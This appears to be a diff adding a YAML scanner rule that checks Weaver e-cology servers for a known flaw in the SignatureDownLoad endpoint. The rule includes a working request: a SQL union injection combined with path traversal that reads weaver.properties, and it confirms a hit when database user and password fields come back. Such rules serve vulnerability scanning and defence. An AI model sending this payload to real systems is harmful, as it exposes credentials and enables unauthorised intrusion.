@@ -1,0 +1,11 @@
+name: ecology-signaturedownLoad
+rules:
+  r0:
+    request:
+      method: GET
+      path: /weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27
+    expression: response.status == 200 && response.body.bcontains(b'ecology.user=') && response.body.bcontains(b'ecology.password=')
+expression: r0()
+detail:
+    links:
+        - https://mp.weixin.qq.com/s/71v9SgVLJk2jg0kBVhkTpA
